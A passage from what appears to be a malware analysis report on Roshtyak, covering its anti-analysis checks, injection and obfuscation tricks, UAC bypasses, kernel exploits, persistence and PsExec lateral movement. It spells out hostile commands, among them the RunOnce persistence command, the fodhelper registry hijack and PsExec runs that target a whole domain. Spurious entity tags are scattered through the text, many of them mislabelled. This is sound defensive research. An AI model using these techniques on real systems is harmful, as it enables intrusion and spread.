repeats this procedure multiple times , averages out the result , and checks that it belongs to a sensible range for a bare metal execution environment . If the sample runs under a hypervisor or in an emulator , the average number of iterations might fall outside of this range , which allows Roshtyak to detect undesirable execution environments.3/16Roshtyak also checks that the value of the cs segment register is either 0x1b or [CARDINAL] 0x23 . Here , 0x1b is the expected value when running on native x86 [PRODUCT] Windows , while [CARDINAL] 0x23 is the expected value under WoW64.APC injection through a random ntdll gadgetRoshtyak performs some of its functionality from separate processes . For example , when it communicates with its [ORG] C&C server , it spawns a new innocent - looking process like regsvr32.exe . Using shared sections , it injects its comms module into the address space of the new process . The injected module is executed via [ORG] APC injection , using [ORG] NtQueueApcThreadEx . Interestingly , the [ORG] ApcRoutine argument ( which marks the target routine to be scheduled for execution ) does not point to the entry point of the injected module . Instead , it points to a seemingly random address inside ntdll . Taking a closer look , we see this address was not chosen randomly but that [PERSON] Roshtyak scanned the code section of ntdll for pop r32 ; ret gadgets ( excluding pop esp , because pivoting the stack would be undesirable ) and picked one at random to use as the [ORG] ApcRoutine . A random pop r32 ; ret gadget used as the entry point for [GPE] APC injectionLooking at the calling convention for the [ORG] ApcRoutine reveals what \u2019s going on . The pop instruction makes the stack pointer point to the SystemArgument1 parameter of [ORG] NtQueueApcThreadEx and so the ret instruction effectively jumps to wherever SystemArgument1 is pointing . This means that by abusing this gadget , Roshtyak can treat SystemArgument1 as the entry point for the purpose of [ORG] APC injection . This obfuscates the control flow and makes the [ORG] NtQueueApcThreadEx call look more legitimate . If someone hooks this function and inspects the [ORG] ApcRoutine argument , the fact that it is pointing into the ntdll code section might be enough to convince them that the call is not malicious . Checking read / write performance on write - combined memoryIn this next check , [PERSON] Roshtyak allocates a large memory buffer with the PAGE_WRITECOMBINE flag . This flag is supposed to modify cache behavior to optimize sequential write performance ( at the expense of read performance and possibly memory ordering ) . Roshtyak uses this to detect if it \u2019s running on a physical machine . It conducts an experiment where it [ORDINAL] first writes to the allocated buffer and then reads from the allocated buffer , all while measuring the read / write performance using a separate thread as a counter . This experiment is repeated [CARDINAL] 32 times and the check is passed only if write performance was [CARDINAL] at [CARDINAL] least [CARDINAL] six times higher than read performance most of the times . If the check fails , Roshtyak intentionally selects a wrong RC4 key , which results in failing to properly decrypt the next layer . Hiding shellcode from plain sightThe injected shellcode is interestingly hidden , too . When Roshtyak prepares for code injection , it [ORDINAL] first creates a large section and maps it into the current process as PAGE_READWRITE . Then , it fills the section with random data and places the shellcode at a random offset within the random data . Since the shellcode is just a relatively small loader followed by random - looking packed data , the whole section looks like random data.4/16A histogram of the bytes inside the shared section . Note that it looks almost random , the most suspicious sign is the slight overrepreseThe section is then unmapped from the current process and mapped into the target process , where it is executed using the above - described [ORG] APC injection technique . The random data was added in an attempt to conceal the existence of the shellcode . Judging only from the memory dump of the target process , it might look like the section is full of random data and does not contain any valid executable code . Even if [CARDINAL] one suspects actual valid code somewhere in the middle of the section , it will not be easy to find its exact location . The start of the shellcode within the shared section . It might be hard to pinpoint the exact start address because it unconventionally starts on an odd bt instruction . [ORG] Ret2Kernel32Roshtyak makes a point of cleaning up after itself . Whenever a certain string or piece of memory is no longer needed , [PERSON] Roshtyak wipes and/or frees it in an attempt to destroy as much evidence as possible . The same holds for [PERSON] Roshtyak \u2019s layers . Whenever [CARDINAL] one layer finishes its job , it frees itself before passing execution onto the next layer . However , the layer can not just simply free itself directly . The whole process would crash if it called [FAC] VirtualFree on the region of memory it \u2019s currently executing from . Roshtyak , therefore , frees the layer through a [ORG] ROP chain executed during layer transitions to avoid this problem . When a layer is about to exit , it constructs a [ORG] ROP chain on the stack and returns into it . An example of such a [ORG] ROP chain can be seen below . This chain starts by returning into [PERSON] VirtualFree and UnmapViewOfFile to release the previous layer \u2019s memory . Then , it returns into the next layer . The return address from the next layer is set to RtlExitUserThread , to safeguard execution.5/16A simple [ORG] ROP chain consisting of [ORG] VirtualFree - > [ORG] UnmapViewOfFile - > next layer - > RtlExitUserThreadMulDiv bugMulDiv is a function exported by [ORG] kernel32.dll , which takes [CARDINAL] three signed [QUANTITY] 32 - bit integers as arguments . It multiplies the [ORDINAL] first [CARDINAL] two arguments , divides the multiplication result by the [ORDINAL] third argument , and returns the final result rounded to the nearest integer . While this might seem like a simple enough function , there \u2019s an ancient sign extension bug in [ORG] Microsoft [ORG] \u2019s implementation . This bug is sort of considered a feature now and might never get fixed . Roshtyak is aware of the bug and tests for its presence by calling [PERSON] MulDiv(1 , 0x80000000 , 0x80000000 ) . On real Windows machines , this triggers the bug and MulDiv erroneously returns [CARDINAL] 2 , even though the correct return value should be [CARDINAL] 1 , because ( 1 * -2147483648 ) / -2147483648 = [CARDINAL] 1 . This allows Roshtyak to detect emulators that do not replicate the bug . For example , this successfully detects [PERSON] Wine , which , funnily enough , contains a different bug , which makes the above call return 0.Tampering with return addresses stored on the stackThere are also tricks designed to obfuscate function calls . As shown in the previous section , [PERSON] Roshtyak likes to call functions using the ret instruction . This next trick is similar in that it also manipulates the stack so a ret instruction can be used to jump to the desired address . To achieve this , [PERSON] Roshtyak scans the current thread \u2019s stack for pointers into the code section of [CARDINAL] one of the previous layers ( unlike the other layers , this one was not freed using the [ORG] ROP chain technique ) . It replaces all these pointers with the address it wants to call . Then it lets the code return multiple times until a ret instruction encounters [CARDINAL] one of the hijacked pointers , redirecting the execution to the desired address . Exception - based checksAdditionally , [PERSON] Roshtyak contains checks that set up a custom vectored exception handler and intentionally trigger various exceptions to ensure they all get handled as expected . Roshtyak sets up a vectored exception handler using RtlAddVectoredExceptionHandler . This handler contains custom handlers for selected exception codes . A top - level exception handler is also registered using SetUnhandledExceptionFilter . This handler should not be called in the targeted execution environments ( none of the intentionally triggered exceptions should fall through the vectored exception handler ) . So this top - level handler just contains a single call to [ORG] TerminateProcess . Interestingly , [PERSON] Roshtyak also uses ZwSetInformationProcess to set SEM_FAILCRITICALERRORS using the ProcessDefaultHardErrorMode class . This ensures that even if the exception somehow is passed all the way to the default exception handler , Windows would not show the standard error message box , which could alert the victim that something suspicious is going on . When everything is set up , [PERSON] Roshtyak begins generating exceptions . The [ORDINAL] first exception is generated by a popf instruction , directly followed by a cpuid instruction ( shown below ) . The value popped by the popf instruction was crafted to set the trap flag , which should , in turn , raise a single - step exception . On a physical machine , the exception would trigger right after the cpuid instruction . Then , the custom vectored exception handler would take over and move the instruction pointer away from the C7 B2 opcodes , which mark an invalid instruction . However , under many hypervisors , the single - step exception would not be raised . This is because the cpuid instruction forces a VM exit , which might delay the effect of the trap flag . If that is the case , the processor will raise an illegal instruction exception when trying to execute the invalid opcodes . If the vectored exception handler encounters such an exception , it knows that it is running under a hypervisor . A variation of this technique is described thoroughly in a blog post by [ORG] Palo [ORG] Alto [ORG] Networks . Please refer to it for more [PERSON] details.6/16The exception - based check using popf and cpuid to detect hypervisorsAnother exception is generated using the [CARDINAL] two - byte int [CARDINAL] 3 instruction ( CD [CARDINAL] 03 ) . This instruction is followed by garbage opcodes . The int [CARDINAL] 3 here raises a breakpoint exception , which is handled by the vectored exception handler . The vectored exception handler does n\u2019t really do anything to handle the exception , which is interesting . This is because by default , when Windows handles the [CARDINAL] two - byte int [CARDINAL] 3 instruction , it will leave the instruction pointer in between the [CARDINAL] two instruction bytes , pointing to the [CARDINAL] 03 byte . When disassembled from this 03 byte , the garbage opcodes suddenly start making sense . We believe this is a check against some overeager debuggers , which could \u201c fix \u201d the instruction pointer to point after the [CARDINAL] 03 byte . Moreover , the vectored exception handler checks the thread \u2019s CONTEXT and makes sure that registers Dr0 through Dr3 are empty . If they are not , the process is being debugged using hardware breakpoints . While this check is relatively common in malware , the CONTEXT is usually obtained using a call to a function like GetThreadContext . Here , the malware authors took advantage of CONTEXT being passed as an argument to the exception handler , so they did not need to call any additional API functions . Large executable mappingsThis next check is interesting mostly because we are not sure what it \u2019s really supposed to check ( in other words , we \u2019d be happy to hear your theories ! ) . It starts with Roshtyak creating a large PAGE_EXECUTE_READWRITE mapping of size [CARDINAL] 0x386F000 . Then it maps this mapping [CARDINAL] nine times into its own address space . After this , it memsets the mapping to 0x42 ( opcode for inc edx ) , except for [DATE] the [DATE] last [DATE] six bytes , which are filled with [CARDINAL] four inc ecx instructions and jmp dword ptr [ ecx ] ( see below ) . Next , it puts the [CARDINAL] nine base addresses of the mapped views into an array , followed by an address of a single ret instruction . Finally , it points ecx into this array and calls the [ORDINAL] first mapped view , which results in all the mapped views being called sequentially until the final ret instruction . After the return , [PERSON] Roshtyak validates that edx got incremented exactly [CARDINAL] 0x1FBE6FCA times ( [CARDINAL] 9 * ( [CARDINAL] 0x386F000 - 6)).The end of the large mapped section . The jmp dword ptr [ ecx ] instruction is supposed to jump to the start of the next mapped view . Our best guess is that this is yet another anti - emulator check . For example , in some emulators , mapped sections might not be fully implemented , so the instructions written into [CARDINAL] one instance of the mapped view might not propagate to the other [CARDINAL] eight instances . Another theory is the check could be done to request large amounts of memory that emulators might fail to provide . After all , the combined size of all the views is [CARDINAL] almost [CARDINAL] half of the standard [QUANTITY] 32 - bit user mode address space . Detecting process suspensionThis trick abuses an undocumented thread creation flag in [GPE] NtCreateThreadEx to detect when [PERSON] Roshtyak \u2019s main process gets externally suspended ( which could mean that a debugger got attached ) . This flag essentially allows a thread to keep running even when PsSuspendProcess gets called . This is coupled with another trick abusing the fact that the thread suspend counter is a signed 8 - bit value , which means that it maxes out at [CARDINAL] 127 . Roshtyak spawns [CARDINAL] two threads , one of which keeps suspending the other one until the suspend counter limit is reached . After this , the [ORDINAL] first thread keeps periodically suspending the other one and checking if the call to NtSuspendThread keeps failing with STATUS_SUSPEND_COUNT_EXCEEDED . If it does not , the thread must have been externally suspended and resumed ( which would leave the suspend counter at [CARDINAL] 126 , so the next call to NtSuspendThread would succeed ) . Not getting this error code would be suspicious enough for Roshtyak to quit using [ORG] TerminateProcess . This entire technique is described in more detail in a blog post by [PERSON] Secret [PERSON] Club . We believe that \u2019s where the authors of Roshtyak7/16got this trick from . It \u2019s also worth mentioning [PERSON] Roshtyak uses this technique only on [PRODUCT] Windows builds [DATE] 18323 ( [CARDINAL] 19H1 ) and later because the undocumented thread creation flag was not implemented on prior builds . Indirect registry writesRoshtyak performs many suspicious registry operations , for example , setting up the [PRODUCT] RunOnce key for persistence . Since modifications to such keys are likely to be monitored , [PERSON] Roshtyak attempts to circumvent the monitoring . It [ORDINAL] first generates a random registry key name and temporarily renames the [PRODUCT] RunOnce key to the random name using [ORG] ZwRenameKey . Once renamed , [ORG] Roshtyak adds a new persistence entry to the temporary key before finally renaming it back to RunOnce . This method of writing to the registry can be easily detected , but it might bypass some simple hooking - based monitoring methods . Similarly , there are multiple methods [ORG] Roshtyak uses to delete files . Aside from the apparent call to NtDeleteFile , [PERSON] Roshtyak is able to effectively delete a file by setting FileDispositionInformation or FileRenameInformation in a call to ZwSetInformationFile . However , unlike the registry modification method , this does n\u2019t seem to be implemented in order to evade detection . Instead , Roshtyak will try these alternative methods if the initial call to [ORG] NtDelete file fails . Checking VBAWarningsThe VBAWarnings registry value controls how [ORG] Microsoft [ORG] Office behaves when a user opens a document containing embedded [PRODUCT] VBA macros . If this value is [CARDINAL] 1 ( meaning \u201c Enable all macros \u201d ) , macros are executed by default , even without the need for any user interaction . This is a common setting for sandboxes , which are designed to detonate maldocs automatically . On the other hand , this setting is uncommon for regular users , who generally do n\u2019t go around changing random settings to make themselves more vulnerable ( at least most of them do n\u2019t ) . Roshtyak therefore uses this check to differentiate between sandboxes and regular users and refuses to run further if the value of [ORG] VBAWarnings is [CARDINAL] 1 . Interestingly , this means that users , who for whatever reason have lowered their security this way , are immune to [PERSON] Roshtyak . Command line wipingRoshtyak \u2019s core is executed with very suspicious command lines , such as RUNDLL32.EXE [ORG] SHELL32.DLL , ShellExec_RunDLL [GPE] REGSVR32.EXE -U /s \" C:\\Users\\ < REDACTED>\\AppData\\Local\\Temp\\dpcw.etl . \" . These command lines do n\u2019t look particularly legitimate , so Roshtyak attempts to hide them during execution . It does this by wiping command line information collected from various sources . It starts by calling GetCommandLineA and GetCommandLineW and wiping both of the returned strings . Then it attempts to wipe the string pointed to by PEB->ProcessParameters->CommandLine ( even if this points to a string that has already been wiped ) . Since [PERSON] Roshtyak is often running under WoW64 , it also calls [PERSON] NtWow64QueryInformationProcess64 to obtain a pointer to PEB64 to wipe ProcessParameters- > CommandLine obtained by traversing this \u201c [ORDINAL] second \u201d PEB . While the wiping of the command lines was probably meant to make Roshtyak look more legitimate , the complete absence of any command line is also highly unusual . This was noticed by the [ORG] Red [ORG] Canary researchers in their blog post , where they proposed a detection method based on these suspiciously empty command lines . [PERSON] Roshtyak \u2019s core process , as shown by [ORG] Process [ORG] Explorer . Note the suspiciously empty command line . Additional tricksAside from the techniques described so far , [PERSON] Roshtyak uses many less sophisticated tricks that are commonly found in other malware as well . These include : Hiding threads using ThreadHideFromDebugger ( and verifying that the threads really got hidden using NtQueryInformationThread ) Patching DbgBreakPoint in ntdll Detecting user inactivity using GetLastInputInfo8/16Checking fields from [ORG] PEB ( [ORG] BeingDebugged , NtGlobalFlag ) Checking fields from [PERSON] KUSER_SHARED_DATA ( KdDebuggerEnabled , ActiveProcessorCount , NumberOfPhysicalPages ) Checking the names of all running processes ( some are compared by hash , some by patterns , and some by character distribution ) Hashing the names of all loaded modules and checking them against a hardcoded blacklist [PERSON] Verifying the main process name is not too long and does n\u2019t match known names used in sandboxes Using the cpuid instruction to check hypervisor information and the processor brand Using poorly documented COM interfaces Checking the username and computername against a hardcoded blacklist Checking for the presence of known sandbox decoy files [ORG] Checking [ORG] MAC addresses of own adapters against a hardcoded blacklist [ORG] Checking [ORG] MAC addresses from the [ORG] ARP table ( using GetBestRoute to populate it and GetIpNetTable to inspect it ) Calling ZwQueryInformationProcess with ProcessDebugObjectHandle , ProcessDebugFlags , and ProcessDebugPort Checking DeviceId of display devices ( using EnumDisplayDevices ) Checking ProductId of \\\\.\\PhysicalDrive0 ( using IOCTL_STORAGE_QUERY_PROPERTY ) Checking for virtual hard disks ( using NtQuerySystemInformation with SystemVhdBootInformation ) Checking the raw [ORG] SMBIOS firmware table ( using NtQuerySystemInformation with SystemFirmwareTableInformation ) Setting up [PERSON] Defender exclusions ( both for paths and processes ) [PERSON] Removing [PERSON] IFEO registry keys related to process names used by the malwareObfuscationWe\u2019ve shown many anti - analysis tricks that are designed to prevent [PERSON] Roshtyak from detonating in undesirable execution environments . These tricks alone would be easy to patch or bypass . What makes analyzing Roshtyak especially lethal is the combination of all these tricks with heavy obfuscation and multiple layers of packing . This makes it very difficult to study the anti - analysis tricks statically and figure out how to pass all the checks in order to get Roshtyak to unpack itself . Furthermore , even the main payload received the same obfuscation , which means that statically analyzing [PERSON] Roshtyak \u2019s core functionality also requires a great deal of deobfuscation . In the rest of this section , we \u2019ll go through the main obfuscation techniques used by Roshtyak . A random code snippet from [PERSON] Roshtyak . As can be seen , the obfuscation makes the raw output of the Hex- Rays decompiler practically incomprehensible . Control flow flatteningControl flow flattening is one of the most noticeable obfuscation techniques employed by Roshtyak . It is implemented in an unusual way , giving the control flow graphs of [ORG] Roshtyak \u2019s functions a unique look ( see below ) . The goal of control flow flattening is to obscure control flow relations between individual code blocks.9/16Control flow is directed by a [QUANTITY] 32 - bit control variable , which tracks the execution state , identifying the code block to be executed . This control variable is initialized at the start of each function to refer to the starting code block ( which is frequently a nop block ) . The control variable is then modified at the end of each code block to identify the next code block that should be executed . The modification is performed using some arithmetic instructions , such as add , sub , or xor . There is a dispatcher using the control variable to route execution into the correct code block . This dispatcher is made up of if / else blocks that are circularly linked into a loop . Each dispatcher block takes the control variable and masks it using arithmetic instructions to check if it should route execution into the code block that it is guarding . What \u2019s interesting here is there are multiple points of entry from the code blocks into the dispatcher loop , giving the control flow graphs the jagged \u201c sawblade \u201d look in IDA.Branching is performed using a special code block containing an imul instruction . It relies on the previous block to compute a branch flag . This branch flag is multiplied using the imul instruction with a random constant , and the result is added , subbed , or xored to the new control variable . This means that after the branch block , the control variable will identify [CARDINAL] one of the [CARDINAL] two possible succeeding code blocks , depending on the value that was computed for the branch flag . Control flow graph of a function obfuscated using control flow flatteningFunction activation keysRoshtyak \u2019s obfuscated functions expect an extra argument , which we call an activation key . This activation key is used to decrypt all local constants , strings , variables , etc . If a function is called with a wrong activation key , the decryption results in garbage plaintext , which will most likely cause Roshtyak to get stuck in an infinite loop inside the control flow dispatcher . This is because all constants used by the dispatcher ( the initial value of the control variable , the masks used by the dispatcher guards , and the constants used to jump to the next code block ) are encrypted with the activation key . Without the correct activation key , the dispatcher simply does not know how to dispatch . Reverse engineering a function is practically impossible without knowing the correct activation key . All strings , buffers , and local variables / constants remain encrypted , all cross - references are lost , and worse , there is no control flow information . Only individual code blocks remain , with no way to know how they relate to each other . Each obfuscated function has to be called from somewhere , which means the code calling the function has to supply the correct activation key . However , obtaining the activation key is not that easy . [ORDINAL] First , call targets are also encrypted with activation keys , so it \u2019s impossible to find where a function is called from without knowing the right activation keys . [ORDINAL] Second , even the supplied activation key is encrypted with the activation key of the calling function . And [CARDINAL] that10/16activation key got encrypted with the activation key of the next calling function . And so on , recursively , all the way until the entry point function . This brings us to how to deobfuscate the mess . The activation key of the entry point function must be there in plaintext . Using this activation key , it is possible to decrypt the call targets and activation keys of functions that are called directly from this entry point function . Applying this method recursively allows us to reconstruct the full call graph along with the activation keys of all the functions . The only exceptions would be functions that were never called and were left in by the compiler . These functions will probably remain a mystery , but since the sample does not use them , they are not that important from a malware analyst \u2019s point of view . Variable maskingSome variables are not stored in plaintext form but are masked using [CARDINAL] one or more arithmetic instructions . This means that if [PERSON] Roshtyak is not actively using a variable , it keeps the variable \u2019s value in an obfuscated form . Whenever Roshtyak needs to use the variable , it has to [ORDINAL] first unmask it before it can use it . Conversely , after [PERSON] Roshtyak uses the variable , it converts it back into the masked form . This masking - based obfuscation method slightly complicates tracking variables during debugging and makes it harder to search memory for a known variable value . Loop transformationsRoshtyak is creative with some loop conditions . Instead of writing a loop like for ( int i = [CARDINAL] 0 ; i < [DATE] 1690 ; i++ ) , it transforms the loop into e.g. for ( int32_t i = 0x06AB91EE ; i ! = 0x70826068 ; i = i * -0x509FFFF + 0xEC891BB1 ) . While both loops will execute exactly [DATE] 1690 times , the [ORDINAL] second one is much harder to read . At [ORDINAL] first glance , it is not clear how many iterations the [ORDINAL] second loop executes ( and if it even terminates ) . Tracking the number of loop iterations during debugging is also much harder in the [ORDINAL] second case . [ORG] PackingAs mentioned , Roshtyak \u2019s core is hidden behind multiple layers of packing . While all the layers look like they were originally compiled into [ORG] PE files , all but the strictly necessary data ( entry point , sections , imports , and relocations ) were stripped away . Furthermore , [PERSON] Roshtyak supports [CARDINAL] two custom formats for storing the stripped [ORG] PE file information , and the layers take turns on what format they use . Additionally , parts of the custom formats are encrypted , sometimes using keys generated based on the results of various anti - analysis checks . This makes it difficult to unpack [PERSON] Roshtyak \u2019s layers statically into a standalone [ORG] PE file . [ORDINAL] First , one would have to reverse engineer the custom formats and figure out how to decrypt the encrypted parts . Then , one would have to reconstruct the [ORG] PE header , the sections , the section headers , and the import table ( the relocation table does n\u2019t need to be reconstructed since relocations can just be turned off ) . While this is all perfectly doable ( and can be simplified using libraries like LIEF ) , it might take a significant amount of time . Adding to this that the layers are sometimes interdependent , it might be easier to just analyze Roshtyak dynamically in memory . A section header in one of the custom PE - like file formats : raw_size corresponds to [LOC] SizeOfRawData , raw_size + virtual_padding_size is effectively [ORG] VirtualSize . There is no [ORG] VirtualAddress or PointerToRawData equivalent because the sections are loaded sequentially . Other obfuscation techniquesIn addition to the above - described techniques , [PERSON] Roshtyak also uses other obfuscation techniques , including : Junk instruction insertion Import hashing Frequent memory wiping [GPE] Mixed boolean - arithmetic obfuscation [ORG] Redundant [ORG] threading [ORG] Heavy polymorphismCore Functionality11/16Now that we \u2019ve described how [PERSON] Roshtyak protects itself , it might be interesting to also go over what it actually does . Roshtyak \u2019s [ORG] DLL is relatively large , over a megabyte , but its functionality is surprisingly simple once you eliminate all the obfuscation . Its main purpose is to download further payloads to execute . In addition , it does the usual evil malware stuff , namely establishing persistence , escalating privileges , lateral movement , and exfiltrating information about the victim . PersistenceRoshtyak [ORDINAL] first generates a random file name in % SystemRoot%\\Temp and moves its [ORG] DLL image there . The generated file name consists of [CARDINAL] two [CARDINAL] to [CARDINAL] eight random lowercase characters concatenated with a random extension chosen from a hardcoded list . The PRNG used to generate this file name is seeded with the volume serial number of C:\\. The sample we analyzed hardcoded [CARDINAL] seven extensions ( .log , .tmp , .loc , .dmp , .out , .ttf , and .etl ) . We observed other extensions being used in other samples , suggesting this list is somewhat dynamic . With a small probability , [PERSON] Roshtyak will also use a randomly generated extension . Once fully constructed , the full path to the Roshtyak DLL might look like e.g. C:\\Windows\\Temp\\wcdp.etl . After the [ORG] DLL image is moved to the new filesystem path , [ORG] Roshtyak stomps its [PRODUCT] Modified timestamp to the current system time . It then proceeds to set up a RunOnce(Ex ) registry key to actually establish persistence . The registry entry is created using the previously described indirect registry write technique . The command inserted into the key might look as follows : RUNDLL32.EXE [ORG] SHELL32.DLL , ShellExec_RunDLL [GPE] REGSVR32.EXE -U /s \" C:\\Windows\\Temp\\wcdp.etl . \"There are a couple of things to note here . [ORDINAL] First , [ORG] regsvr32 does n\u2019t care about the extensions of the DLLs it loads , allowing Roshtyak to hide under an innocent - looking extension such as .log . [ORDINAL] Second , the /s parameter puts regsvr32 into silent mode . Without it , regsvr32 would complain that it did not find an export named [GPE] DllUnregisterServer . Finally , notice the trailing period character at the end of the path . This period is removed during path normalization , so it practically has no effect on the command . We are not exactly sure what the author \u2019s original intention behind including this period character is . It looks like it could have been designed to trick some anti- malware software into not being able to connect the persistence entry with the payload on the filesystem . By default , [PERSON] Roshtyak uses the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce key for persistence . However , under some circumstances ( such as when it detects that [PERSON] Kaspersky is running by checking for a process named avp.exe ) the key [ORG] HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx will be used instead . The [ORG] RunOnceEx key is capable of loading a [ORG] DLL , so when using this key , Roshtyak specifies shell32.dll directly , omitting the use rundll32.A RunOnceEx persistence entry established by [ORG] RoshtyakPrivilege escalationRoshtyak uses both [ORG] UAC bypasses and regular [GPE] EoP exploits in an attempt to elevate its privileges . Unlike many other pieces of malware , which just blindly execute whatever [ORG] UAC bypasses / exploits the authors could find , [PERSON] Roshtyak makes efforts to figure out if the privilege escalation method is even likely to be successful . This was probably implemented to lower the chances of detection due to the unnecessary usage of incompatible bypasses / exploits . For [ORG] UAC bypasses , this involves checking the ConsentPromptBehaviorAdmin and [ORG] ConsentPromptBehaviorUser registry keys . For [PERSON] EoP exploits , this is about checking the Windows build number and patch level . Besides checking the ConsentPromptBehavior(Admin|User ) keys , [PERSON] Roshtyak performs other sanity checks to ensure that it should proceed with the [ORG] UAC bypass . Namely , it checks for admin privileges using [ORG] CheckTokenMembership with the SID S-1 - 5 - 32 - 544 ( DOMAIN_ALIAS_RID_ADMINS ) . It also inspects the value of the DbgElevationEnabled flag in [GPE] KUSER_SHARED_DATA.SharedDataFlags . This is an undocumented flag that is set if [ORG] UAC is enabled . Finally , there are AV checks for [ORG] BitDefender ( detected by the module [PERSON] atcuf32.dll ) , [PERSON] Kaspersky ( process avp.exe ) , and our own [ORG] Avast / AVG ( module aswhook.dll ) . If [CARDINAL] one of these [PRODUCT] AVs is detected , [PERSON] Roshtyak avoids selected [ORG] UAC bypass techniques , presumably the ones that might result in detection . As for the actual [ORG] UAC bypasses , there are [CARDINAL] two main methods implemented . The [ORDINAL] first is an implementation of the aptly named ucmDccwCOM method from UACMe . Interestingly when this method is executed , [PERSON] Roshtyak temporarily masquerades its process as explorer.exe by overwriting FullDllName and BaseDllName in the _ LDR_MODULE structure corresponding to the main executable module . The payload launched by this method is a12/16randomly named [ORG] LNK file , dropped into % TEMP% using the IShellLink COM interface . This [ORG] LNK file is designed to relaunch the Roshtyak DLL , through LOLBins such as advpack or register - cimprovider . The [ORDINAL] second method is more of a [ORG] UAC bypass framework than a specific bypass method , because multiple UAC bypass methods follow the same simple pattern : [ORDINAL] first registering some specific shell open command and then executing an autoelevating Windows binary ( which internally triggers the shell open command ) . For instance , a [ORG] UAC bypass might be accomplished by writing a payload command to [PERSON] HKCU\\Software\\Classes\\ms- settings\\shell\\open\\command and then executing fodhelper.exe from % windir%\\system32 . Basically , the same bypass can be achieved by substituting the pair ms - settings / fodhelper.exe with other pairs , such as mscfile / eventvwr.exe . Roshtyak uses the following [CARDINAL] six pairs to bypass [ORG] UAC : Executable Launcher . SystemSettings slui.exeLet \u2019s now look at the kernel exploits ( CVE-2020 - 1054 and CVE-2021 - 1732 ) Roshtyak uses to escalate privileges . As is often the case in [PERSON] Roshtyak , these exploits are stored encrypted and are only decrypted on demand . Interestingly , once decrypted , the exploits turn out to be regular [ORG] PE files with completely valid headers ( unlike the other layers in [PERSON] Roshtyak , which are either in shellcode form or stored in a custom stripped [ORG] PE format ) . Moreover , the exploits lack the obfuscation given to the rest of [PERSON] Roshtyak , so their code is immediately decompilable , and only some basic string encryption is used . We do n\u2019t know why the attackers left these exploits so exposed , but it might be due to the difference in bitness . While Roshtyak itself is x86 code ( most of the time running under WoW64 ) , the exploits are x64 ( which makes sense considering they exploit vulnerabilities in [CARDINAL] 64 - bit code ) . It could be that the obfuscation tools used by [PERSON] Roshtyak \u2019s authors were designed to work on x86 and are not portable to [GPE] x64.Snippet from Roshtyak \u2019s exploit for CVE-2020 - 1054 , scanning through [ORG] IsMenu to find the offset to HMValidateHandle . To execute the exploits , Roshtyak spawns ( the AMD64 version of ) winver.exe and gets the exploit code to run there using the KernelCallbackTable injection method . [PERSON] Roshtyak \u2019s implementation of this injection method essentially matches a public [GPE] PoC , with the biggest difference being the usage of slightly different API functions due to the need for cross - subsystem injection ( e.g. [PERSON] NtWow64QueryInformationProcess64 instead of NtQueryInformationProcess or NtWow64ReadVirtualMemory64 instead of ReadProcessMemory ) . The code injected into winver.exe is not the exploit [ORG] PE itself but rather a slightly obfuscated shellcode , designed to load the exploit [ORG] PE into memory . The kernel exploits target certain unpatched versions of Windows . Specifically , CVE-2020 - 1054 is only used on Windows 7 systems where the revision number is not higher than 24552 . On the other hand , the exploit for CVE- 2021 - 1732 runs on [FAC] Windows [FAC] 10 , with the targeted build number range being from [DATE] 16353 [DATE] to [DATE] 19042 . Before exploiting CVE-2021 - 1732 , [PERSON] Roshtyak also scans through installed update packages to see if a patch for the vulnerability is installed . It does this by enumerating the registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Component Based Servicing\\Packages and checking if the package for [PRODUCT] KB4601319 ( or higher ) is present . Lateral movementWhen it comes to lateral movement , [PERSON] Roshtyak simply uses the tried and tested [NORP] PsExec tool . Before executing [PERSON] PsExec , [PERSON] Roshtyak ensures it makes sense to run it by checking for a [ORG] SID matching the \u201c well - known \u201d [ORG] WinAccountDomainAdminsSid group . If domain admin rights are not detected , [PERSON] Roshtyak skips its lateral movement phase entirely . Roshtyak attempts to get around detection by setting [PERSON] Defender exclusions , as [ORG] PsExec is often flagged as a hacktool ( for good reasons ) . It sets a path exclusion for % TEMP% ( where it will drop [ORG] PsExec and other files used for lateral13/16movement ) . Later , it sets up a process exclusion for the exact path from which [ORG] PsExec will be executed . While we would expect [ORG] PsExec to be bundled inside Roshtyak , it turns out Roshtyak downloads it on demand from url The downloaded zip archive is dropped into % TEMP% under a random name with the .zip extension . [ORG] PsExec is then unzipped from this archive using [PRODUCT] the [PRODUCT] Windows [PRODUCT] Shell COM interface ( [ORG] IShellDispatch ) into a randomly named .exe file in % TEMP%.The payload to be executed by [ORG] PsExec is a self - extracting package created by a tool called [ORG] IExpress . This is an archaic installer that \u2019s part of [PRODUCT] Windows , which is probably why it \u2019s used , since Roshtyak can rely on it already being on the victim machine . The installer generation is configured by a text file using [ORG] the [ORG] Self [ORG] Extraction [ORG] Directive ( [ORG] SED ) syntax . [PERSON] Roshtyak \u2019s IExpress configuration templateRoshtyak uses a [ORG] SED configuration template with [CARDINAL] three placeholders ( % 1 , % 2 , and % [CARDINAL] 3 ) that it substitutes with real values at runtime . As seen above , the configuration template was written in mixed - case , which is frequently used in [PERSON] Raspberry [PERSON] Robin in general . Once the [ORG] SED configuration is prepared , it is written into a randomly named .txt file in % TEMP% . Then , iexpress is invoked to generate the payload using a command such as C:\\Windows\\iexpress.exe /n /q < path_to_sed_config > . The generated payload is dumped into a randomly named .exe file in % TEMP% , as configured by the [ORG] TargetName directive ( placeholder % 1).Once the payload is generated , [PERSON] Roshtyak proceeds to actually run [ORG] PsExec . There are [CARDINAL] two ways Roshtyak can execute [PERSON] PsExec . The [ORDINAL] first one uses the command < path_to_psexec > \\\\ * -accepteula -c -d -s < path_to_payload > . Here , the \\\\ * wildcard instructs [ORG] PsExec to run the payload on all computers in the current domain . Alternatively , [PERSON] Roshtyak might run the command < path_to_psexec > @<path_to_target_file > - accepteula -c -d -s < path_to_payload > . Here , the target_file is a text file containing a specific list of computers to run the payload on . Roshtyak builds this list by enumerating [ORG] Active [ORG] Directory objects using API functions exported from activeds.dll . Profiling the victimUSB worms tend to have a life of their own . Since their worming behavior is usually completely automated , the threat actor who initially deployed the worm does n\u2019t necessarily have full control over where it spreads . This is why it \u2019s important for threat actors to have the worm beacon back to their [ORG] C&C servers . With a beaconing mechanism in place , the threat actor can be informed about all the machines under their control and can use this knowledge to manage the worm as a whole . The outgoing beaconing messages typically contain some information about the infected machine . This helps financially - motivated cybercriminals decide on how to best monetize the infection . Roshtyak is no exception to this , and it collects a lot of information about each infected victim . Roshtyak concatenates all the collected information into a large string , using semicolons as delimiters . This large string is then 